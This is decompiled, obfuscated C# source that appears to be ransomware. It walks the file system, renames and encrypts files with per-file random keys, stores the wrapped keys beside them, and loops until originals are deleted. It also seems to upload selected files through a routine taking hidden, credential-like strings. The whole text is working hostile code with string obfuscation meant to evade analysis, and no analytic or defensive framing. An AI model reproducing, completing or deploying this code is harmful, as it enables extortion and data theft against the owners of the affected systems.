using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using BulNWfwtwrJjybP;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class yIZYKSYRaZXoZvGddM
{
	public sealed class sOyIZRPurmEXm
	{
		private static StringCollection qWxMaOHQAwBjW;

		private static List<string> BqIYufUWArylHjSRz;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107406476));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107392624)) && !text.ToLower().Contains(getString_0(107406503)) && !text.ToLower().Contains(getString_0(107393102)) && !text.ToLower().Contains(getString_0(107393121)) && !text.ToLower().Contains(getString_0(107406458)) && !text.ToLower().Contains(getString_0(107393043)) && !text.ToLower().Contains(getString_0(107392927)) && !text.ToLower().Contains(getString_0(107392878)) && !text.ToLower().Contains(getString_0(107392893)) && !text.ToLower().Contains(getString_0(107392332)) && !text.ToLower().Contains(getString_0(107392330)) && !text.ToLower().Contains(getString_0(107392281)) && !text.ToLower().Contains(getString_0(107392296)) && !text.ToLower().Contains(getString_0(107392251)) && !text.ToLower().Contains(getString_0(107392262)) && !text.ToLower().Contains(getString_0(107392217)) && !text.ToLower().Contains(getString_0(107392204)) && !text.ToLower().Contains(getString_0(107392187)) && !text.ToLower().Contains(getString_0(107392202)) && !text.Contains(dAXyboFAql(getString_0(107392153))) && !text.Contains(getString_0(107392160)) && !text.Contains(getString_0(107392115)) && !text.EndsWith(getString_0(107395350)) && !text.EndsWith(getString_0(107392602)) && !text.EndsWith(getString_0(107392597)) && !text.EndsWith(getString_0(107392592)) && !text.EndsWith(getString_0(107392619)) && !text.ToLower().Contains(getString_0(107392614)) && !text.ToLower().Contains(CrIMGxZNxmnsF))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(VQcuZcdUECpj) * 1024.0 * 1024.0 && cIxqzYzUXVduz == getString_0(107396813))
							{
								BqIYufUWArylHjSRz.Add(text);
							}
							else if (File.Exists(text) && cIxqzYzUXVduz == getString_0(107396270))
							{
								BqIYufUWArylHjSRz.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return BqIYufUWArylHjSRz;
		}

		static sOyIZRPurmEXm()
		{
			Strings.CreateGetStringDelegate(typeof(sOyIZRPurmEXm));
			qWxMaOHQAwBjW = new StringCollection();
			BqIYufUWArylHjSRz = new List<string>();
		}
	}

	private sealed class NFcTJoyMAlaMTsP
	{
		public string nwAYAbmTKnUjGt;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == nwAYAbmTKnUjGt;
		}
	}

	private sealed class HodDzwKVtgQ
	{
		private sealed class nrgETWiaiUK
		{
			public HodDzwKVtgQ IjsltDfwDzUt;

			public string HKWFUJQtGU;

			public void _003CCrypt_003Eb__1f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					dfBOVDMYdNLmH(WindowsIdentity.GetCurrent().Name, HKWFUJQtGU);
				}
			}

			public void _003CCrypt_003Eb__20()
			{
				rsYOdvIgzWi(HKWFUJQtGU, IjsltDfwDzUt.kfhntlBdbyqlPyI, IjsltDfwDzUt.WVKUKadbJyEcF, IjsltDfwDzUt.tXqjlNtlAwegU, IjsltDfwDzUt.cNqEjjpUqBHDJCycCC);
			}
		}

		public string[] kfhntlBdbyqlPyI;

		public string[] tXqjlNtlAwegU;

		public string cNqEjjpUqBHDJCycCC;

		public string WVKUKadbJyEcF;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1e(string string_0)
		{
			nrgETWiaiUK CS_0024_003C_003E8__locals0 = new nrgETWiaiUK();
			CS_0024_003C_003E8__locals0.IjsltDfwDzUt = this;
			CS_0024_003C_003E8__locals0.HKWFUJQtGU = string_0;
			if (bLbMRmlIqKb && !QTpaEkHdBvx().Contains(getString_0(107389083)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						dfBOVDMYdNLmH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.HKWFUJQtGU);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HpbWCpkqwlpVpmb == getString_0(107396819))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rsYOdvIgzWi(CS_0024_003C_003E8__locals0.HKWFUJQtGU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.kfhntlBdbyqlPyI, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.WVKUKadbJyEcF, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.tXqjlNtlAwegU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.cNqEjjpUqBHDJCycCC);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rsYOdvIgzWi(CS_0024_003C_003E8__locals0.HKWFUJQtGU, kfhntlBdbyqlPyI, WVKUKadbJyEcF, tXqjlNtlAwegU, cNqEjjpUqBHDJCycCC);
			}
		}

		static HodDzwKVtgQ()
		{
			Strings.CreateGetStringDelegate(typeof(HodDzwKVtgQ));
		}
	}

	private sealed class iOicLYfXayCEbJ
	{
		private sealed class XbuYXBiSsEmiD
		{
			public iOicLYfXayCEbJ itnzcOJuoNO;

			public string gxCUSkWQwfzunw;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2c()
			{
				foreach (string item in eiWezuyCGKD)
				{
					if (gxCUSkWQwfzunw.ToLower().EndsWith(item + itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == getString_0(107396830))
					{
						if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(gxCUSkWQwfzunw).Length)
						{
							try
							{
								jJNOnNgWhS.BqAVxlRXrfWmNzV(getString_0(107393470), getString_0(107393497), getString_0(107393452), gxCUSkWQwfzunw);
							}
							catch
							{
							}
						}
					}
					else if (gxCUSkWQwfzunw.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396287))
					{
						try
						{
							jJNOnNgWhS.BqAVxlRXrfWmNzV(getString_0(107393470), getString_0(107393497), getString_0(107393452), gxCUSkWQwfzunw);
						}
						catch
						{
						}
					}
				}
			}

			static XbuYXBiSsEmiD()
			{
				Strings.CreateGetStringDelegate(typeof(XbuYXBiSsEmiD));
			}
		}

		private sealed class tUsqmcfKvfUs
		{
			public iOicLYfXayCEbJ itnzcOJuoNO;

			public string yjymTnfyumAdTQN;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in eiWezuyCGKD)
				{
					if (yjymTnfyumAdTQN.ToLower().EndsWith(item + itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == getString_0(107396833))
					{
						if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(yjymTnfyumAdTQN).Length)
						{
							try
							{
								jJNOnNgWhS.BqAVxlRXrfWmNzV(getString_0(107393473), getString_0(107393500), getString_0(107393455), yjymTnfyumAdTQN);
							}
							catch
							{
							}
						}
					}
					else if (yjymTnfyumAdTQN.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396290))
					{
						try
						{
							jJNOnNgWhS.BqAVxlRXrfWmNzV(getString_0(107393473), getString_0(107393500), getString_0(107393455), yjymTnfyumAdTQN);
						}
						catch
						{
						}
					}
				}
			}

			static tUsqmcfKvfUs()
			{
				Strings.CreateGetStringDelegate(typeof(tUsqmcfKvfUs));
			}
		}

		public List<string> KWOxGmriSwhi;

		public List<string> sgLbAoBHxjjEl;

		public string TgZlbgeobaAUJX;

		public string[] sIKBGqcsXgr;

		public string OFTUyyIDOSKVU;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2b(string string_0)
		{
			XbuYXBiSsEmiD CS_0024_003C_003E8__locals0;
			foreach (string item in sgLbAoBHxjjEl)
			{
				if (sIKBGqcsXgr.Length != 0)
				{
					string[] array = sIKBGqcsXgr;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(TgZlbgeobaAUJX))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || mfvCVNdCLAD.Contains(item))
				{
					continue;
				}
				if (NjvrgrwIrOwQYj == getString_0(107396827))
				{
					try
					{
						if (pWuXVNymRcRzH.WNolxFETYpyTdRCb(item))
						{
							pWuXVNymRcRzH.QbSCVVjTHjQf(item);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(item);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(item)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(item));
				}
				LdWnWgipDWiVy(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (geeOWbkDyamU)
						{
							try
							{
								File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + item + getString_0(107406487) + ex2.Message + getString_0(107396680));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (JxuqTkcAaBSWi == getString_0(107396827) && new FileInfo(item).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024 && !KWOxGmriSwhi.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new XbuYXBiSsEmiD();
						CS_0024_003C_003E8__locals0.itnzcOJuoNO = this;
						try
						{
							if (TgZlbgeobaAUJX != getString_0(107389522))
							{
								File.Move(item, item + TgZlbgeobaAUJX);
							}
						}
						catch (Exception ex4)
						{
							if (geeOWbkDyamU)
							{
								try
								{
									File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + item + getString_0(107406906) + ex4.Message + getString_0(107396680));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = getString_0(107393418);
						if (TgZlbgeobaAUJX != getString_0(107389522))
						{
							CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item + TgZlbgeobaAUJX;
						}
						else
						{
							CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item;
						}
						if (pXuFbktiBaug == getString_0(107396827))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in eiWezuyCGKD)
								{
									if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == XbuYXBiSsEmiD.getString_0(107396830))
									{
										if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw).Length)
										{
											try
											{
												jJNOnNgWhS.BqAVxlRXrfWmNzV(XbuYXBiSsEmiD.getString_0(107393470), XbuYXBiSsEmiD.getString_0(107393497), XbuYXBiSsEmiD.getString_0(107393452), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2) && xhUXlAlyfax == XbuYXBiSsEmiD.getString_0(107396287))
									{
										try
										{
											jJNOnNgWhS.BqAVxlRXrfWmNzV(XbuYXBiSsEmiD.getString_0(107393470), XbuYXBiSsEmiD.getString_0(107393497), XbuYXBiSsEmiD.getString_0(107393452), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = luLsrRUpsgAuX.mhByoYlUVluy(32);
						string s = ntOxoEXCcs.TSaKwZntIBTq(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = YQWUSoctiyTfY.LoatnGvftUwX(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						YQWUSoctiyTfY.cPwpfRLVLwkR(EvuIFAZTaVnqAXFR: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? SuHHuNKVUauxPEQ.TXbfqRrcSLbdJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SuHHuNKVUauxPEQ.TXbfqRrcSLbdJ(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IUdoiJFmoLEExqz: CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, BGqjlFsUzej: bytes);
					}
					else
					{
						string text2 = luLsrRUpsgAuX.mhByoYlUVluy(32);
						string s2 = ntOxoEXCcs.TSaKwZntIBTq(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (TgZlbgeobaAUJX != getString_0(107389522))
						{
							if (!aDzhxFxDvB)
							{
								if (!HHLzNKWftxhcT)
								{
									SzxhvEQrnUWoe(item, item + TgZlbgeobaAUJX, JkKFSdXHCQ);
								}
								else
								{
									SzxhvEQrnUWoe(item, item + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HHLzNKWftxhcT)
									{
										EHrKmISxBKusFz(item, item + TgZlbgeobaAUJX, JkKFSdXHCQ);
									}
									else
									{
										EHrKmISxBKusFz(item, item + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (geeOWbkDyamU)
									{
										try
										{
											File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + item + getString_0(107389476) + ex6.Message + getString_0(107396680));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aDzhxFxDvB)
						{
							if (!HHLzNKWftxhcT)
							{
								SzxhvEQrnUWoe(item, item + getString_0(107389517), JkKFSdXHCQ);
							}
							else
							{
								SzxhvEQrnUWoe(item, item + getString_0(107389517), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HHLzNKWftxhcT)
								{
									EHrKmISxBKusFz(item, item, JkKFSdXHCQ);
								}
								else
								{
									EHrKmISxBKusFz(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + item + getString_0(107389476) + ex8.Message + getString_0(107396680));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (HHLzNKWftxhcT)
						{
							if (TgZlbgeobaAUJX != getString_0(107389522))
							{
								iXEoarVznApjVqS(item + TgZlbgeobaAUJX, bytes2);
							}
							else
							{
								iXEoarVznApjVqS(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				sgLbAoBHxjjEl.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2d(string string_0)
		{
			tUsqmcfKvfUs CS_0024_003C_003E8__locals0 = new tUsqmcfKvfUs();
			CS_0024_003C_003E8__locals0.itnzcOJuoNO = this;
			CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN = string_0;
			if (sIKBGqcsXgr.Length != 0)
			{
				string[] array = sIKBGqcsXgr;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(TgZlbgeobaAUJX))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!mfvCVNdCLAD.Contains(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
			{
				if (NjvrgrwIrOwQYj == getString_0(107396827))
				{
					try
					{
						if (pWuXVNymRcRzH.WNolxFETYpyTdRCb(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
						{
							pWuXVNymRcRzH.QbSCVVjTHjQf(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN));
				}
				LdWnWgipDWiVy(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (geeOWbkDyamU)
						{
							try
							{
								File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107406487) + ex2.Message + getString_0(107396680));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (JxuqTkcAaBSWi == getString_0(107396827) && new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024)
					{
						try
						{
							if (TgZlbgeobaAUJX != getString_0(107389522))
							{
								File.Move(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX);
							}
						}
						catch (Exception ex4)
						{
							if (geeOWbkDyamU)
							{
								try
								{
									File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107406906) + ex4.Message + getString_0(107396680));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (TgZlbgeobaAUJX != getString_0(107389522))
						{
							CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN += TgZlbgeobaAUJX;
						}
						if (pXuFbktiBaug == getString_0(107396827))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in eiWezuyCGKD)
								{
									if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == tUsqmcfKvfUs.getString_0(107396833))
									{
										if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length)
										{
											try
											{
												jJNOnNgWhS.BqAVxlRXrfWmNzV(tUsqmcfKvfUs.getString_0(107393473), tUsqmcfKvfUs.getString_0(107393500), tUsqmcfKvfUs.getString_0(107393455), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item) && xhUXlAlyfax == tUsqmcfKvfUs.getString_0(107396290))
									{
										try
										{
											jJNOnNgWhS.BqAVxlRXrfWmNzV(tUsqmcfKvfUs.getString_0(107393473), tUsqmcfKvfUs.getString_0(107393500), tUsqmcfKvfUs.getString_0(107393455), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = luLsrRUpsgAuX.mhByoYlUVluy(32);
						string s = ntOxoEXCcs.TSaKwZntIBTq(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = YQWUSoctiyTfY.LoatnGvftUwX(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						YQWUSoctiyTfY.cPwpfRLVLwkR(EvuIFAZTaVnqAXFR: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? SuHHuNKVUauxPEQ.TXbfqRrcSLbdJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SuHHuNKVUauxPEQ.TXbfqRrcSLbdJ(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IUdoiJFmoLEExqz: CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, BGqjlFsUzej: bytes);
					}
					else
					{
						string text2 = luLsrRUpsgAuX.mhByoYlUVluy(32);
						string s2 = ntOxoEXCcs.TSaKwZntIBTq(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (TgZlbgeobaAUJX != getString_0(107389522))
						{
							if (!aDzhxFxDvB)
							{
								if (!HHLzNKWftxhcT)
								{
									SzxhvEQrnUWoe(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, JkKFSdXHCQ);
								}
								else
								{
									SzxhvEQrnUWoe(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HHLzNKWftxhcT)
									{
										EHrKmISxBKusFz(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, JkKFSdXHCQ);
									}
									else
									{
										EHrKmISxBKusFz(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (geeOWbkDyamU)
									{
										try
										{
											File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389476) + ex6.Message + getString_0(107396680));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aDzhxFxDvB)
						{
							if (!HHLzNKWftxhcT)
							{
								SzxhvEQrnUWoe(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389517), JkKFSdXHCQ);
							}
							else
							{
								SzxhvEQrnUWoe(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389517), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HHLzNKWftxhcT)
								{
									EHrKmISxBKusFz(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, JkKFSdXHCQ);
								}
								else
								{
									EHrKmISxBKusFz(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, getString_0(107389225) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389476) + ex8.Message + getString_0(107396680));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (HHLzNKWftxhcT)
						{
							if (TgZlbgeobaAUJX != getString_0(107389522))
							{
								iXEoarVznApjVqS(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, bytes2);
							}
							else
							{
								iXEoarVznApjVqS(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			sgLbAoBHxjjEl.Remove(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
		}

		static iOicLYfXayCEbJ()
		{
			Strings.CreateGetStringDelegate(typeof(iOicLYfXayCEbJ));
		}
	}

	private sealed class fDwEtSuXSxJBuR
	{
		public string WqSRVcNJKBpb;

		public string olhyjfhvpIWUIA;

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					File.Delete(WqSRVcNJKBpb);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(olhyjfhvpIWUIA))
					{
						File.Delete(olhyjfhvpIWUIA);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string XTNtJjAvASbm;

	public static byte[] JkKFSdXHCQ;

	public static string cIxqzYzUXVduz;

	public static string VQcuZcdUECpj;

	public static List<string> PelwIoYLMluwkT;

	public static List<string> NlUoosbgDN;

	public static string aNVPohsbWbid;

	public static string OFTUyyIDOSKVU;

	public static string WFhUCfopZvgdKa;

	public static string iWUecWvWvdy;

	public static int aSuWOKqpTFWLZt;

	public static string NjvrgrwIrOwQYj;

	public static string VpJGOcUaTwfpij;

	public static string mqeQDptBukI;

	public static string hYdMzWyQBJgl;

	public static string dqMjwzdylpdLK;

	public static string KpXSYjCAPyvtw;

	public static string ihApggwfGvkG;

	public static string SotcHURFSsO;

	public static List<string> pjYhYVVkRFVa;

	public static List<string> PYEHnBxJBpISsEZ;

	public static string MblmlkeceAY;

	public static string FJXsFcPZKBWlNn;

	public static string oVErvisfbdnQp;

	public static List<string> mfvCVNdCLAD;

	public static string WdQFHfcExMiYlnK;

	private static string AtNcgpYdstMFwdNy;

	public static string HpbWCpkqwlpVpmb;

	public static string eKcpSjrBmJYP;

	public static List<string> UitWgaprnpOe;

	public static List<string> MUKeFWwqRbsUt;

	public static List<string> QxnFKMJGHHM;

	public static List<string> tYFycaveyEZlTZa;

	public static string yaObxwDYeQoq;

	public static List<string> DZKPMstogvMqutY;

	public static List<string> jGCPbbWylwhkiZ;

	public static string aWvdmtYWLU;

	public static string DRlOGAWkgnPyhTM;

	internal static DateTime fpPKoegyFTl;

	internal static DateTime odkofmjGNehiR;

	public static string JxuqTkcAaBSWi;

	public static string LSeqdHjjsVhLqcK;

	public static string EgQwzOCvnHMPfG;

	public static string SmtRihlsiEMW;

	public static string HuXyLjhiTYuOC;

	public static string svEcVjBTCnuAYEoPH;

	public static string FLSEvrhuWfJ;

	public static string pXuFbktiBaug;

	public static List<string> eiWezuyCGKD;

	public static string xhUXlAlyfax;

	public static string LglvkdAEDeokrPA;

	public static string gDLhAzrZSKssbSP;

	public static string TOzFyVZevgZt;

	public static string iMYZrEovwwqNE;

	public static string xNSqMIOLMLAwy;

	public static string VMmbarXfpds;

	public static string MAIfUAvpaRAOicbA;

	public static string dOhNMoendime;

	public static string ZuONjNkcSQG;

	public static string BsEhNrYEPyIbuei;

	public static string BYECuHinFzglbhHW;

	public static string YIPXGAmIVTAgIi;

	public static string YmTiJprAuyeUnyd;

	public static string LRFgFKajMFF;

	public static string iTtbTuAkveiFQ;

	public static string ynsgvIeaItiOAP;

	public static string MeHrIQtFIeB;

	public static string cCTuunwfNioo;

	public static string CrIMGxZNxmnsF;

	public static string HazSUKRRBl;

	public static string oFPgjCRDHeJnCyn;

	public static string xoOIzmzChOZBJa;

	public static string lAoTEijSeOCrur;

	public static string JdCefxYFMIQXhE;

	public static string VbexJOEZOrg;

	public static string vKGebXPGqUoRq;

